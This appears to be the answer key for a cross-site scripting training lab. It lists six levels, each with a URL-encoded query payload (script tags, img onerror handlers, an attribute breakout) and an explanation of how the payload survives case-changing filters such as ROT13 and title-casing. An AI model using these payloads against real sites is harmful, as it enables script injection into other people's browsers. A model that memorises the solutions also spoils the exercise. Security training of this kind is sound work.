# casemanip — solutions

Case-manipulation transforms (lowercase tags, ROT13, title-case, strip uppercase) — HTML is case-insensitive so most payloads survive.

### casemanip-level1

`/casemanip/level1/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: only tag names are lowercased — already lowercase; attributes untouched

### casemanip-level2

`/casemanip/level2/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: first letter capitalised → `<Img …>` still parses

### casemanip-level3

`/casemanip/level3/?query=%3CIMG%20SRC=X%20ONERROR=ALERT(1)%3E`

- payload: `<IMG SRC=X ONERROR=ALERT(1)>`
- context: case swapped to lowercase — HTML is case-insensitive

### casemanip-level4

`/casemanip/level4/?query=%22%3E%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `"><img src=x onerror=alert(1)>`
- context: ROT13 corrupts visible <p>, but raw value reflected in hidden input — attribute breakout fires

### casemanip-level5

`/casemanip/level5/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: only uppercase letters stripped — payload is all lowercase

### casemanip-level6

`/casemanip/level6/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: title-case per word — single token, only `<` is non-alpha so the `s` is upcased → `<Script>` still valid
